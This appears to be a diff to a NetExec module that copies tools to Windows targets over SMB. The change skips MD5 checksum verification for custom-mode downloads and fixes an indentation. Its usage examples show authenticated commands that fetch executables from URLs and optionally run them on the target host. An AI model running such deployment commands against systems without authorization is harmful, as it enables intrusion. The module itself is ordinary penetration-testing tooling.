@@ -31,7 +31,7 @@ class NXCModule:
         --------
         nxc smb 192.168.1.1 -u {user} -p {password} --local-auth -M ds -o MODE=enum
         nxc smb 192.168.1.1 -u {user} -p {password} --local-auth -M ds -o MODE=enum DIR=C:\\Windows\\Temp\\
-    nxc smb 192.168.1.1 -u {user} -p {password} --local-auth -M ds -o MODE=custom CUSTOM=/path/to/tools/
+        nxc smb 192.168.1.1 -u {user} -p {password} --local-auth -M ds -o MODE=custom CUSTOM=/path/to/tools/
         nxc smb 192.168.1.1 -u {user} -p {password} --local-auth -M ds -o MODE=custom CUSTOM=/path/to/agent.exe
         nxc smb 192.168.1.1 -u {user} -p {password} --local-auth -M ds -o MODE=custom CUSTOM=https://example.com/tool1.exe,https://example.com/tool2.exe
         nxc smb 192.168.1.1 -u {user} -p {password} --local-auth -M ds -o MODE=custom CUSTOM=https://example.com/tool.exe EXEC=True ARGS='--help'
@@ -103,7 +103,7 @@ class NXCModule:
             if os.path.exists(local_path) and not self.FORCE:
                 context.log.highlight(f"{filename} already exists locally, skipping download.")
             else:
-                # Download the file and verify its MD5 checksum
+                # Download the file and verify its MD5 checksum (if not in custom mode)
                 if not self.download_and_verify_tool(context, tool, local_path) and not self.FORCE:
                     continue  # Skip if the checksum doesn't match and FORCE is False
 
@@ -111,7 +111,7 @@ class NXCModule:
             self.transfer_tool_to_target(context, connection, local_path)
 
     def download_and_verify_tool(self, context, tool, local_path):
-        """Download a tool and verify its MD5 checksum."""
+        """Download a tool and verify its MD5 checksum if not in custom mode."""
         filename = os.path.basename(local_path)
         expected_md5 = tool["md5"]
 
@@ -122,15 +122,19 @@ class NXCModule:
                 f.write(response.content)
             context.log.highlight(f"Saved {filename} to {local_path}.")
 
-            # Verify the MD5 checksum
-            if self.calculate_md5(local_path) == expected_md5:
-                context.log.debug(f"MD5 checksum verified for {filename}.")
-                return True
+            # Skip MD5 verification if the mode is custom
+            if self.MODE != "custom" and expected_md5:
+                if self.calculate_md5(local_path) == expected_md5:
+                    context.log.debug(f"MD5 checksum verified for {filename}.")
+                    return True
+                else:
+                    context.log.fail(f"MD5 checksum mismatch for {filename}. File may be corrupted or tampered with.")
+                    if not self.FORCE:
+                        os.remove(local_path)  # Remove the corrupted file if FORCE is False
+                    return False
             else:
-                context.log.fail(f"MD5 checksum mismatch for {filename}. File may be corrupted or tampered with.")
-                if not self.FORCE:
-                    os.remove(local_path)  # Remove the corrupted file if FORCE is False
-                return False
+                context.log.debug(f"Skipping MD5 checksum verification for {filename} in custom mode.")
+                return True
         except Exception as e:
             context.log.fail(f"Failed to download {filename}: {e}")
             return False
@@ -220,6 +224,7 @@ class NXCModule:
         context.log.highlight("Deploying custom tools...")
         for tool in self.custom_tools:
             if tool.startswith(("http://", "https://")):
+                # Pass an empty MD5 value for custom tools
                 self.download_and_transfer_tool(context, connection, {"url": tool, "md5": ""})
             elif os.path.isfile(tool):
                 self.transfer_tool_to_target(context, connection, tool)
